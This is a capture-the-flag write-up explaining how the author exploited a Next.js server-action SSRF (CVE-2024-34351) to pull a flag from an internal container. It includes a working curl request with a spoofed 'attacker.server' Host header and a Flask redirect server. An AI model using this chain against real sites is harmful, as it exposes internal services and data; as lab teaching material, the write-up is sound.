## Log Action (431 points)

### Description
I keep trying to log in, but it's not working :'(
[http://log-action.challenge.uiuc.tf/](http://log-action.challenge.uiuc.tf/)

### Application analysis
The application is dockerized and consists of two containers:
- **backend**: A simple `nginx` image with `flag.txt` in the `/usr/share/nginx/html/` directory.
- **frontend**: A `node`, `next-js` application available under the challenge URL.

#### Backend
The `backend` container does not have any ports mapped, so it is not accessible externally. This setup suggests the potential for an SSRF vulnerability. To verify this, I attempted to fetch the `flag.txt` from the `frontend` container:
```bash
wget backend/flag.txt
```
This successfully downloaded `flag.txt`.

#### Frontend
The `next-js` application consists of:
- `src/app/page.tsx`: Landing page with a link to the `login` page.
- `src/app/login/page.tsx`: Login page with a simple username/password form, utilizing the `authenticate` action imported from `src/lib/actions.ts`.
- `src/app/logout/page.tsx`: Logout page with a form utilizing an inlined action that uses the `signOut` method from the `next-auth` API and the `redirect` function from `next-js`.
- `src/lib/actions.ts`: Server actions file defining the `authenticate` function.
- `src/auth.config.ts`: Configuration file for `next-auth`.
- `src/auth.ts`: File with `NextAuth` middleware instance.

The `package.json` file lists the following dependencies:
```json
{
	"dependencies": {  
		"bcrypt": "^5.1.1",  
		"next": "14.1.0",  
		"next-auth": "^5.0.0-beta.19",  
		"react": "^18.3.1",  
		"react-dom": "^18.3.1",  
		"zod": "^3.23.8"  
	}
}
```

One notable thing is that unlike other dependencies, `next` is locked to version `14.1.0`. A quick search shows that this version has the following vulnerability: `Server-Side Request Forgery in Server Actions` with CVE assigned: `CVE-2024-34351`. This sounds like something we could exploit :)

### SSRF (CVE-2024-34351) requirements
Let's read the research notes posted by the researchers who found the vulnerability: https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps. Citing the authors:
```
To recap, to be vulnerable to this SSRF, we require that:

- A server action is defined;
- The server action redirects to a URL starting with /;
- We are able to specify a custom Host header while accessing the application.
```
It looks like we can fulfill all the requirements:
- the `authenticate` server action is defined in `src/lib/actions.ts` and it executes `redirect('/admin')`
- the inlined server action is defined in `src/app/logout/page.tsx` and it executes `redirect('/logout')`
- we can directly access the frontend application and send it any headers we want

### The sink
Let's look at how we can fire any of the`redirect('/...')`.

#### src/lib/actions.ts
```typescript
"use server";  
import { AuthError } from "next-auth";  
import { signIn } from "@/auth";  
import { redirect } from "next/navigation";  
export async function authenticate(  
  prevState: string | undefined,  
  formData: FormData,  
) {  
  let foundError = false;  
  try {  
    await signIn('credentials', formData);  
  } catch (error) {  
    if (error instanceof AuthError) {  
      foundError = true;  
      switch (error.type) {  
        case 'CredentialsSignin':  
          return 'Invalid credentials.';  
        default:  
          return 'Something went wrong.';  
      }    
    }    
    throw error;  
  } finally {  
    if (!foundError) {  
      redirect('/admin');  
    }  
  }
}
```
To fire the `redirect()` in the `authenticate` function, we would need to first correctly sign in or cause the process to throw an error other than `AuthError` (because then, `foundError=false`). It doesn't look trivial because the `authorize` function in `src/auth.js`:
- requires the password to be `randomBytes(16).toString("hex")` which is a random, not guessable string
- uses `zod`'s `safeParse` function, so it shouldn't throw any errors

#### src/app/logout/page.tsx
```typescript
import Link from "next/link";
import { redirect } from "next/navigation";
import { signOut } from "@/auth";

export default function Page() {
  return (
    <>
      <h1 className="text-2xl font-bold">Log out</h1>
      <p>Are you sure you want to log out?</p>
      <Link href="/admin">
        Go back
      </Link>
      <form
        action={async () => {
          "use server";
          await signOut({ redirect: false });
          redirect("/login");
        }}
      >
        <button type="submit">Log out</button>
      </form>
    </>
  )
}
```
To fire the `redirect()` in the inlined action, we would just need to submit the form. The `/logout` page and this form are accessible without a user session, so it looks like it satisfies our needs :).

### Exploitation
#### Triggering the vulnerable action
To exploit this vulnerability, we need the `Next-Action` ID to trigger the action. Navigate to the logout page (http://log-action.challenge.uiuc.tf/logout), hit the `Log out` button, and grab the `Next-Action` header from the Network tab in Chrome. This simple `curl` request triggers the server action:
```bash
curl 'http://log-action.challenge.uiuc.tf/logout' \
  -H 'Content-Type: application/json' \
  -H 'Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de' \
  --data-raw '{}'
```

#### Setting up the server
Let's go back to the vulnerability authors' post. To perform the exploit, we will need to, citing the authors again:
```
- Set up a server that takes requests on any path.
- On any HEAD request, return a 200 with Content-Type: text/x-component.
- On a GET request, return a 302 to our intended SSRF target (such as metadata.internal or the like)
- When NextJS fetches from our server, it will satisfy the preflight check on our HEAD request, but will follow the redirect on GET, giving us a full read SSRF!
```
Let's set up such a server. We'll just copy a simple flask server code provided in the post and adjust the redirect URL so it fetches the flag from `backend` container:
```python
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
	if request.method == 'HEAD':
		resp = Response("")
		resp.headers['Content-Type'] = 'text/x-component'
		return resp
	return redirect('https://backend/flag.txt')
```

#### Crafting the payload
Now, the last thing to do is to add our custom `Host` header to the URL pointing to our server:
```bash
curl 'http://log-action.challenge.uiuc.tf/logout' \
  -H 'Content-Type: application/json' \
  -H 'Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de' \
  -H 'Host: attacker.server' \
  --data-raw '{}'
```
And boom! We get the flag:
```
uiuctf{close_enough_nextjs_server_actions_welcome_back_php}
```

### Credits
- Minh (https://whitehoodhacker.net/) for creating this challenge
- Adam Kues and Shubham Shah from Assetnote for finding the vulnerability in `next-js` Server Actions and publishing this nice note: https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
